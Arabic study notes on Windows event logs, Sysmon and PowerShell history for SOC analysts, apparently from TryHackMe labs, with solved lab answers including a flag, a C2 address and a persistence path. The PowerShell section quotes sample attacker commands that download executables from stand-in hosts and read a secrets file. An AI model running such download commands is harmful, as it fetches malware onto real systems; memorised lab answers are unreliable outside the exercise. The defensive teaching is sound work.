
---

# What Is Logged? – Summary

## 🔎 Logging Overview

أي نشاط بيحصل على جهازك — زي:

- تشغيل برنامج
    
- إنشاء ملف
    
- تسجيل الدخول
    

نظام التشغيل (OS) بيعالجه، وبعدها ممكن يسجله في **Log**.

كل سطر بيتسجل في السجل ده اسمه **Log Entry**، وبيحتوي عادةً على:

- التوقيت
    
- نوع النشاط
    
- المستخدم اللي نفذ العملية
    

### 🎯 أهمية الـ Logs في SOC

الـ Logs عنصر أساسي في عمل فريق الأمن (SOC)، وبتساعد في:

- **Incident Response** → معرفة متى وكيف حصل الهجوم
    
- **Threat Hunting** → البحث عن أنشطة مشبوهة
    
- **Alerting & Triage** → بناء قواعد التنبيه والكشف
    

---

# Windows Event Logs

نظام **Microsoft Windows** عنده نظام تسجيل قوي جدًا، لكن قراءة اللوجز محتاجة خبرة.

الملفات بتتخزن في:

C:\Windows\System32\winevt\Logs

وبتكون بصيغة **EVTX (Binary format)**.

---

## 🗂 أنواع اللوجز

كل ملف EVTX بيمثل فئة معينة، مثل:

- **Application Logs** → أحداث من البرامج (زي IIS أو SQL)
    
- **Security Logs** → تسجيل الدخول، العمليات، إدارة المستخدمين
    

---

# Reading Logs with Event Viewer

نستخدم أداة:

## Event Viewer

لفتحها:

- ابحث عن _Event Viewer_
    
- أو اضغط `Win + R`
    
- واكتب: `eventvwr`
    

---

## مكونات Event Viewer

- **Log Sources** → مصادر اللوجز (كل EVTX ملف مستقل)
    
- **Log List** → قائمة بالأحداث
    
- **Event ID** → رقم ثابت لكل نوع حدث
    
- **Date & Time** → وقت الحدث (System Time)
    
- **Keywords** → نجاح / فشل
    
- **Details Tab** → تفاصيل الحدث بصيغة نص أو XML
    
- **Filters** → فلترة الأحداث
    

---

# What Is Logged?

فيه:

- أكثر من 500 Event ID في Security Logs فقط
    
- آلاف الـ Event IDs إجمالًا
    

لكن مش كل الأحداث بتكون مفعّلة افتراضيًا.

في شغل SOC اليومي، بنركز على أهم الأحداث المرتبطة بـ:

- تسجيل الدخول
    
- العمليات
    
- الامتيازات
    
- الحسابات
    

---

# 🔐 Important Event ID

السؤال كان:

> Which event ID describes a successful login?

الإجابة الصحيحة:

**Security / 4624**

🔹 Event ID **4624** = Successful Logon  
🔹 Event ID **4625** = Failed Logon


------------------------------------------
------------------------------
------------
# 🔐 Security Log: Authentication – Summary

## 📌 Overview

من بين كل سجلات **Microsoft Windows** الافتراضية،  
يُعتبر **Security Log** هو الأهم بالنسبة لمحلل الأمن (SOC).

أهم حدثين لازم تحفظهم:

|Event ID|المعنى|
|---|---|
|**4624**|Successful Logon|
|**4625**|Failed Logon|

---

# 🟢 Event ID 4624 – Successful Logon

### 🎯 الهدف

- كشف تسجيلات دخول مشبوهة (RDP / Network)
    
- تحديد نقطة بداية الهجوم
    

### 📍 أين يُسجل؟

على الجهاز الهدف (الذي يتم تسجيل الدخول عليه)

### ⚠️ ملاحظة

- بيكون **Noisy جدًا**
    
- السيرفرات المزدحمة ممكن تسجل مئات الأحداث في الدقيقة
    

---

# 🔴 Event ID 4625 – Failed Logon

### 🎯 الهدف

- كشف:
    
    - Brute Force
        
    - Password Spraying
        
    - Vulnerability Scanning
        

### 📍 أين يُسجل؟

على الجهاز الهدف

### ⚠️ ملاحظة

- أحيانًا يكون **مضلل**
    
- يحتاج تحليل دقيق لفهم السياق
    

---

# 🧠 أهم الحقول التي تراجعها في 4624

ركز فقط على هذه الحقول الأساسية:

- **Logon ID**
    
- **Logon Type**
    
- **Username**
    
- **Source IP Address**
    
- **Workstation Name**
    

مش محتاج تحفظ كل الحقول عشان تبقى L1/L2 قوي 👌

---

# 🔢 أهم Logon Types

| Logon Type | المعنى                    |     |
| ---------- | ------------------------- | --- |
| 2          | Interactive (Local Login) |     |
| 3          | Network Login             |     |
| 10         | Remote Desktop (RDP)      |     |
**Logon Type** يوضح **كيف قام المستخدم بتسجيل الدخول إلى الجهاز** (طريقة الدخول).  
###### هذا مهم جدًا في **التحليل الأمني و الـ SOC** لأن نوع الدخول قد يكشف هجوم مثل **RDP brute force** أو **lateral movement**.
###### ---

# 🚨 Detecting RDP Brute Force

## الخطوات:

1️⃣ افتح Security Log  
2️⃣ فلتر على **4625**  
3️⃣ ركز على Logon Type **3 أو 10**

### 🚩 Red Flags

- محاولات كتير بأسماء مستخدمين مختلفة  
    (admin – helpdesk – cctv) → Password Spraying
    
- محاولات فشل كثيرة على حساب واحد  
    (عادة Administrator) → Brute Force
    
- Workstation Name غريب  
    (مثلاً: kali بدل اسم جهاز الشركة)
    
- Source IP غير متوقع  
    (مثلاً Printer يحاول يدخل على Server!)
    

---

# 🖥 Analyse Successful RDP Logins

## الخطوات:

1️⃣ فلتر على **4624**  
2️⃣ ابحث عن Logon Type **10**

### ملاحظة مهمة:

لو NLA مفعل،  
كل Logon Type 10 بيكون قبله مباشرة 4624 بنوع **3**

عشان تعرف اسم الجهاز الحقيقي (Workstation Name)،  
راجع حدث Logon Type 3 السابق له.

---

# 🎯 لو شكيت إن الدخول خبيث

بعد تسجيل الدخول الناجح:

- Windows بيعيّن **Logon ID** (مثال: 0x5D6AC)
    
- ده Session Identifier فريد
    

🔥 احفظ Logon ID  
لأنك هتستخدمه عشان تتبع:

- العمليات اللي اتنفذت
    
- الأوامر
    
- الامتيازات
    
- تحركات المهاجم بعد الدخول
    

---

# 💡 خلاصة عملية لأي SOC Analyst

- 4625 = قبل الدخول (محاولة هجوم)
    
- 4624 = بعد الدخول (تم الاختراق؟)
    
- Logon Type هو مفتاح الفهم
    
- Source IP + Workstation Name أهم من عدد المحاولات
    
- Logon ID هو مفتاح تتبع الجلسة

----------------------
------------------------
--------------
# Security Log – User Management

## الفكرة الأساسية

في **Windows Security Event Log** يمكن تتبع كل العمليات التي تحدث على حسابات المستخدمين مثل:

- إنشاء حساب
    
- تغيير كلمة المرور
    
- إضافة مستخدم إلى مجموعة
    
- حذف حساب
    

وهذه الأحداث مهمة جدًا في **التحقيقات الأمنية** لأن المهاجمين غالبًا:

- ينشئون حسابًا خلفيًا (Backdoor Account)
    
- يضيفون أنفسهم لمجموعة **Administrators**
    
- يغيرون كلمات المرور للسيطرة على الحسابات
    

---

# أهم Event IDs الخاصة بإدارة المستخدمين

|Event ID|ماذا يعني|الاستخدام الخبيث|
|---|---|---|
|**4720**|إنشاء حساب جديد|إنشاء حساب Backdoor|
|**4722**|تفعيل حساب|إعادة تفعيل حساب قديم|
|**4738**|تعديل حساب|تغيير خصائص المستخدم|
|**4725**|تعطيل حساب|تعطيل حسابات مهمة|
|**4726**|حذف حساب|حذف آثار الهجوم|
|**4723**|المستخدم غيّر كلمة المرور|نشاط طبيعي أو اختراق|
|**4724**|إعادة تعيين كلمة المرور|سيطرة على حساب|
|**4732**|إضافة مستخدم إلى مجموعة|إعطاء صلاحيات Admin|
|**4733**|إزالة مستخدم من مجموعة|إزالة صلاحيات|

---

# تركيب (Structure) أحداث إدارة المستخدمين

كل الأحداث تتكون من **3 أجزاء رئيسية**:

### 1️⃣ Subject

الحساب الذي قام بالعملية.

مثال:

Administrator created a new user

ويحتوي أيضًا على **Logon ID**.

---

### 2️⃣ Object

الحساب الذي تم التعديل عليه.

مثال:

New user: backup_admin

---

### 3️⃣ Details

تفاصيل التغيير.

مثل:

- المجموعة التي تمت الإضافة إليها
    
- إعدادات الحساب
    
- انتهاء صلاحية كلمة المرور
    

---

# كيف يستخدمها محلل SOC في التحقيق

عند البحث عن حسابات مخترقة:

1️⃣ افتح **Security Logs**

2️⃣ فلتر الأحداث التالية:

4720  
4732

3️⃣ ابحث عن علامات الخطر مثل:

- إنشاء حساب في وقت متأخر من الليل
    
- اسم مستخدم غير طبيعي
    
- حساب غير معروف من فريق IT
    
- إضافة حساب جديد إلى **Administrators**
    

---

# خطوة التحقيق التالية

لو وجدت حدثًا مشبوهًا:

1️⃣ انسخ **Logon ID**

2️⃣ ابحث عن حدث تسجيل الدخول المرتبط به مثل  
**Event ID 4624**

3️⃣ من هناك ستعرف:

- عنوان الـ IP
    
- الجهاز المستخدم
    
- وقت الدخول
    

---

# مثال هجوم حقيقي

المهاجم قد يفعل التسلسل التالي:

4624  → تسجيل دخول  
4720  → إنشاء حساب  
4732  → إضافة الحساب إلى Administrators

وهذا يعني غالبًا:

⚠️ **تم إنشاء حساب Admin خفي داخل النظام**



-------------------

------------


---

# ملخص: Sysmon – Process Monitoring

## لماذا نحتاج Process Monitoring؟

أحيانًا نعرف أن جهازًا تم اختراقه (مثلاً من خلال محاولات تسجيل الدخول)، لكن لا نعرف:

- كيف بدأ الهجوم
    
- أي برنامج تم تشغيله
    
- ماذا فعل المهاجم داخل الجهاز
    

هنا يأتي دور **مراقبة العمليات**.

---

# طرق تسجيل تشغيل البرامج في Windows

هناك طريقتان أساسيتان:

|Event Code|المصدر|ماذا يسجل|الملاحظات|
|---|---|---|---|
|**4688**|Security Log|تسجيل إنشاء أي Process|غير مفعل افتراضيًا|
|**1**|Sysmon|تسجيل إنشاء Process مع معلومات إضافية|يحتاج تثبيت Sysmon|

---

# ما هو Sysmon؟

**Sysmon**  
هو أداة مجانية من **Microsoft** ضمن مجموعة **Sysinternals**.

وظيفته:

- تسجيل نشاط النظام بالتفصيل
    
- تسجيل العمليات التي يتم تشغيلها
    
- تسجيل الـ hashes الخاصة بالملفات
    
- تتبع سلسلة العمليات (Process Tree)
    

📍 مكان سجلاته في **Event Viewer**:

```
Applications & Services
→ Microsoft
→ Windows
→ Sysmon
→ Operational
```

---

# أهم المعلومات في Sysmon Event ID 1

عند تشغيل أي برنامج يتم تسجيل عدة معلومات:

## 1️⃣ Process Info

معلومات البرنامج نفسه:

- Process ID
    
- Path للبرنامج
    
- Command Line
    

مثال:

```
C:\Windows\System32\cmd.exe
```

---

## 2️⃣ Parent Process

البرنامج الذي قام بتشغيله.

مثال:

```
explorer.exe → cmd.exe
```

هذا يساعد في بناء **Process Tree** لمعرفة تسلسل الهجوم.

---

## 3️⃣ Binary Info

معلومات الملف التنفيذي:

- SHA256
    
- MD5
    
- التوقيع الرقمي
    
- معلومات PE file
    

يمكن استخدام الـ Hash لفحص الملف على **VirusTotal**.

---

## 4️⃣ User Context

المستخدم الذي شغل البرنامج.

ويحتوي أيضًا على:

```
Logon ID
```

وهو نفس الموجود في **Security Logs**.

---

# علامات الخطر التي يبحث عنها محلل SOC

## 1️⃣ مكان الملف

إذا كان البرنامج في مسار غير طبيعي مثل:

```
C:\Temp
C:\Users\Public
```

---

## 2️⃣ اسم الملف

مثل:

```
aa.exe
jqyvpqldou.exe
```

أسماء عشوائية غالبًا تشير إلى malware.

---

## 3️⃣ Hash الملف

إذا كان **SHA256 أو MD5** معروف كـ malware في VirusTotal.

---

## 4️⃣ Parent Process غريب

مثال:

```
notepad.exe → cmd.exe
```

هذا غير طبيعي.

---

# كيف يتم تحليل العملية

### الخطوات

1️⃣ افتح **Sysmon Logs**

2️⃣ فلتر:

```
Event ID = 1
```

3️⃣ افحص:

- اسم البرنامج
    
- مساره
    
- الـ Hash
    
- Parent Process
    

4️⃣ إذا كان مشبوهًا:

ارجع خطوة في **Process Tree**

وابحث عن:

```
ParentProcessId
```

---

# تتبع الهجوم بالكامل

بعد معرفة العملية:

فلتر كل الأحداث باستخدام:

```
Logon ID
```

في:

- Security Logs
    
- Sysmon Logs
    

وبذلك يمكنك معرفة:

- متى دخل المهاجم
    
- ماذا شغل
    
- كيف بدأ الهجوم
    

---

# الخلاصة

**Process Monitoring** مهم لأنه:

- يكشف البرامج التي شغلها المهاجم
    
- يساعد في بناء **Attack Chain**
    
- يربط بين **Login Events** و **العمليات المشبوهة**
    

ولهذا السبب تعتمد أغلب فرق **SOC** على **Sysmon** بدل الاعتماد فقط على سجلات Windows الافتراضية.

---

Which URL was the file downloaded from?  
Note: Use other Sysmon events to find out!
# الفكرة الأساسية في التلميح


عند تحميل ملف من الإنترنت عبر متصفح مثل **Mozilla Firefox** أو Edge أو Chrome، يقوم Windows بإضافة **Zone Identifier** داخل **Alternate Data Stream** للملف.

مثال:

file.exe:Zone.Identifier

داخل هذا الـ ADS يتم تخزين معلومات مثل:

ZoneId=3  
HostUrl=...  
ReferrerUrl=...

وهنا يظهر **الرابط الحقيقي الذي تم التحميل منه**.

---

# الحدث الذي نبحث عنه في Sysmon

يجب فلترة:

Event ID = 15

هذا الحدث يسمى:

FileCreateStreamHash

ويظهر عندما يتم إنشاء **Alternate Data Stream**.


-------------

-------------

---------


---

# أولًا: الفكرة العامة من هذا الدرس

أداة **Sysmon** تسجل نشاطات كثيرة داخل نظام **Microsoft Windows** مثل:

- تشغيل البرامج
    
- إنشاء الملفات
    
- الاتصالات الشبكية
    
- استعلامات DNS
    
- تغييرات الريجستري
    

هذه السجلات تساعد فرق **SOC و DFIR** في فهم ما حدث داخل الجهاز بعد الاختراق.

في الدرس السابق ركزنا على:

```
Event ID 1
```

وهو **Process Creation**.

لكن الهجوم الحقيقي لا يتوقف عند تشغيل البرنامج فقط، بل يشمل:

- إنشاء ملفات
    
- الاتصال بسيرفرات
    
- تغيير إعدادات النظام
    

ولهذا نحتاج أحداث Sysmon أخرى.

---

# ثانيًا: أهم الأحداث الجديدة في هذا الدرس

## 1️⃣ Event ID 11 — File Create

هذا الحدث يسجل **إنشاء أي ملف جديد** في النظام.

### لماذا مهم؟

malware غالبًا يقوم بـ:

- إسقاط ملفات جديدة
    
- إنشاء سكربتات
    
- إنشاء ملفات للبقاء في النظام (Persistence)
    

### مثال

```
C:\Users\Public\malware.exe
```

أو

```
Startup folder
```

---

## 2️⃣ Event ID 13 — Registry Value Set

يسجل **تغيير قيم في Registry**.

المهاجم يستخدم هذا غالبًا لـ:

- Persistence
    
- تعطيل الحماية
    
- تشغيل malware تلقائيًا
    

---

## 3️⃣ Event ID 3 — Network Connection

يسجل **أي اتصال شبكي** تقوم به العملية.

يتضمن معلومات مثل:

- Destination IP
    
- Destination Port
    
- Process Image
    

### مثال

```
Process: malware.exe
Destination IP: 193.46.217.4
Port: 7777
```

هذا قد يشير إلى اتصال مع **Command & Control server**.

---

## 4️⃣ Event ID 22 — DNS Query

يسجل **طلبات DNS** التي تقوم بها العملية.

مثال:

```
QueryName: example.com
```

وهذا يساعد في معرفة **الدومين الحقيقي** المرتبط بالـ IP.

---

# ثالثًا: لماذا نحتاج ربط الأحداث مع بعضها

كل حدث Sysmon يحتوي على:

```
ProcessId
```

لكن بعض المعلومات مثل:

- المستخدم
    
- Parent Process
    
- Command line
    

تظهر فقط في:

```
Event ID 1
```

لذلك طريقة التحليل تكون:

```
Event 1 → معرفة العملية
Event 3 → معرفة الاتصالات
Event 11 → معرفة الملفات التي أنشأتها
Event 22 → معرفة الدومين
```

وهذا يسمى:

**Attack Chain Reconstruction**

أي إعادة بناء تسلسل الهجوم.

---

# رابعًا: علامات الخطر التي يبحث عنها محلل SOC

## في الاتصالات الشبكية

- اتصال على Port غير طبيعي مثل:
    

```
4444
7777
1337
```

- اتصال إلى IP خارجي
    
- IP معروف كـ malware في VirusTotal
    

---

## في DNS

دومينات مشبوهة مثل:

```
*.top
*.click
```

أو أسماء عشوائية.

---

## في الملفات

إنشاء ملفات في:

```
C:\Temp
C:\Users\Public
```

أو:

```
Startup folder
```

لأن هذا يدل على **Persistence**.

---

# خامسًا: تطبيق التحليل على الملف

نفتح الملف:

```
Practice-Sysmon.evtx
```

داخل **Event Viewer**.

---

# السؤال الأول

## Which file was created by the downloaded malware to persist on the host?

### الفكرة

malware يريد أن يعمل كل مرة يتم تشغيل الجهاز.

أسهل طريقة لذلك هي وضع ملف في:

```
Startup Folder
```

هذا المجلد يشغل أي ملف بداخله تلقائيًا عند تسجيل الدخول.

---

### الخطوات

1. فلترة:
    

```
Event ID = 11
```

2. البحث عن ملف تم إنشاؤه داخل:
    

```
Startup
```

---

### النتيجة

الملف الذي أنشأه malware هو:

```
C:\Users\sarah.miller\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\DeleteApp.url
```

---

# السؤال الثاني

## What is the Command & Control server malware connected to?

### الفكرة

بعد تشغيل malware، يتصل بخادم المهاجم.

يسمى:

```
C2 Server
```

---

### الخطوات

1. فلترة:
    

```
Event ID = 3
```

2. البحث عن الاتصال الصادر من العملية.
    

---

### النتيجة

```
193.46.217.4:7777
```

---

# السؤال الثالث

## Finally, which domain does the malicious IP correspond to?

### الفكرة

الـ malware عادة يتصل بالدومين أولًا.

DNS يحوله إلى IP.

---

### الخطوات

فلترة:

```
Event ID = 22
```

---

### النتيجة

الدومين المرتبط بالـ IP هو:

```
hkfasfsafg.click
```

---

# الخلاصة

من خلال تحليل Sysmon استطعنا إعادة بناء جزء من الهجوم:

1️⃣ malware تم تشغيله  
2️⃣ أنشأ ملف **Persistence** داخل Startup  
3️⃣ اتصل بخادم **Command & Control**  
4️⃣ الخادم مرتبط بدومين مشبوه

---

**Persistence File**

```
C:\Users\sarah.miller\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\DeleteApp.url
```

**C2 Server**

```
193.46.217.4:7777
```

**Domain**

```
hkfasfsafg.click
```

---
-----
----------

# أولاً: شرح PowerShell Logging

في نظام **Microsoft Windows** يوجد أداة قوية جدًا اسمها **Windows PowerShell**.

PowerShell يسمح للمستخدم أو المهاجم بتنفيذ:

- إدارة النظام
    
- قراءة الملفات
    
- اكتشاف المستخدمين
    
- تحميل malware
    
- تنفيذ سكربتات
    
- استخراج بيانات
    

لهذا السبب يستخدمه المهاجمون كثيرًا.

---

# لماذا لا تكفي Sysmon أو Process Logs؟

عند تشغيل PowerShell يحدث هذا الحدث فقط:

powershell.exe started

مثال في **Sysmon Event ID 1**

لكن المشكلة:

PowerShell يمكنه تنفيذ **عشرات الأوامر داخل نفس الجلسة** بدون إنشاء process جديد.

مثال:

Get-ChildItem  
Get-Content secrets.txt  
Get-LocalUser  
Invoke-WebRequest http://c2server.thm/a.exe

كل هذه الأوامر نفذت داخل نفس:

powershell.exe

لذلك **Sysmon لن يظهر هذه الأوامر**.

---

# كيف نعرف الأوامر التي تم تنفيذها؟

Windows يحفظ تاريخ الأوامر في ملف يسمى:

PowerShell History File

المسار:

C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

هذا الملف:

- ملف نصي عادي
    
- يسجل كل الأوامر التي يكتبها المستخدم في PowerShell
    
- يتم تحديثه مباشرة بعد الضغط على Enter
    

---

# مثال لما يوجد داخل الملف

Get-ComputerInfo  
Get-LocalUser  
Get-Content secrets.txt  
Invoke-WebRequest http://malicious.site/malware.exe

من خلاله يمكن لمحلل **SOC / DFIR** معرفة:

- ماذا فعل المهاجم
    
- هل قام بتحميل malware
    
- هل قرأ ملفات حساسة
    
- هل قام باستكشاف النظام
    

---

# ملاحظات مهمة عن PowerShell History

1️⃣ يتم إنشاء ملف history لكل مستخدم.

مثلاً:

Administrator  
Bob  
Alice

كل مستخدم له history خاص به.

---

2️⃣ الملف يبقى موجودًا بعد إعادة تشغيل الجهاز.

---

3️⃣ لا يسجل:

- ناتج الأوامر
    
- محتوى السكربتات
    

مثال:

powershell .\script.ps1

سيتم تسجيل الأمر فقط وليس محتوى السكربت.

---

# ثانياً: خطوات الحل على الـ VM

## السؤال الأول

### Which PowerShell command was executed first?

الخطوات:

1️⃣ اذهب إلى المسار:

C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

2️⃣ افتح الملف:

ConsoleHost_history.txt

3️⃣ اقرأ أول سطر في الملف.

النتيجة:

Get-ComputerInfo

هذا أول أمر تم تنفيذه.

---

# السؤال الثاني

### When did the Administrator run the first PS command?

ملف history لا يحتوي على timestamps.

لذلك نحتاج معرفة **وقت إنشاء الملف**.

الخطوات:

1️⃣ اضغط Right Click على الملف:

ConsoleHost_history.txt

2️⃣ اختر:

Properties

3️⃣ ستجد:

Created

النتيجة:

May 18, 2025

وهذا يعني أن أول أمر PowerShell تم تشغيله في هذا التاريخ.

---

# السؤال الثالث

### Can you find the flag stored in the PowerShell history?

التلميح يقول:

Check other local users

لأن كل مستخدم لديه history خاص به.

---

### الخطوات

1️⃣ انتقل إلى مستخدم آخر:

C:\Users\thm.bob\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

2️⃣ افتح الملف:

ConsoleHost_history.txt

3️⃣ ابحث داخل الملف عن flag.

النتيجة:

THM{it_was_me!}